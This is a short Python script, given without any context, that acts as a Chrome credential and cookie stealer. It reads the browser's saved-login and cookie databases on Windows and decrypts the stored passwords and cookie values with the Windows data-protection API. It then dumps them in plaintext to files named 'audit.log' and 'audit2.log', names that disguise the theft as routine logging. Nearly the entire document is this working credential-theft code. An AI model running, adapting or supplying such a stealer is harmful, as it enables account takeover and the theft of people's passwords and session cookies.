from os import getenv, remove
import sys
import sqlite3
import win32crypt

# Connect to the Database
conn = sqlite3.connect(getenv(r"APPDATA") + r"\..\Local\Google\Chrome\User Data\Default\Login Data")
cursor = conn.cursor()
# Get the results
cursor.execute('SELECT action_url, username_value, password_value FROM logins')

txt_string = ''
for result in cursor.fetchall():
	# Decrypt the Password
	password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
	if password:
		txt_string = txt_string + 'Site: ' + result[0] + '\n'
		txt_string = txt_string + 'Username: ' + result[1] + '\n'
		txt_string = txt_string + 'Password: ' + str(password) + '\n\n'


txt_file_path = getenv(r"APPDATA") + r"\audit.log"
txt_file = open(txt_file_path, "w")
txt_file.write(txt_string)
txt_file.close()

conn = sqlite3.connect(getenv(r"APPDATA") + r"\..\Local\Google\Chrome\User Data\Default\cookies")
cursor = conn.cursor()
# Get the results
cursor.execute('SELECT creation_utc, host_key, name, value, path, expires_utc, secure, httponly, last_access_utc, has_expires, persistent, priority, encrypted_value, firstpartyonly FROM cookies')

txt_string = ''
for result in cursor.fetchall():
	# Decrypt 
	plaincookie = win32crypt.CryptUnprotectData(result[12], None, None, None, 0)[1]
	if plaincookie:
        # netscape format cookies. 
        # Nasty lazy code: All machines in domain always TRUE. Secure connection needed always FALSE. Expiration always 2026.
		txt_string = txt_string + result[1] + '\tTRUE\t' + result[4] + '\tFALSE\t1767225599\t' + result[2] + '\t' + str(plaincookie) + '\n'

txt_file_path = getenv(r"APPDATA") + r"\audit2.log"
txt_file = open(txt_file_path, "w")
txt_file.write(txt_string)
txt_file.close()
